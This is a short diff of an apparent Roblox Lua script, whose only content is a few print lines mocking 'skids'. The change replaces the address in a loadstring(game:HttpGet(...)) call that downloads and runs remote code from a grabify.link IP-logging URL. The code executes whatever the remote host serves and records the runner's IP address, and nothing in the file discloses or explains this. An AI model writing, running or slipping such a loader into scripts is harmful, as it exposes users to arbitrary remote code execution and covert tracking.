@@ -3,5 +3,5 @@ local skidcheck = "skids checked."
 
 print(execute)
 
-loadstring(game:HttpGet("https://grabify.link/QAA1HR", true))()
+loadstring(game:HttpGet("https://grabify.link/GBGWGK", true))()
 print(skidcheck)
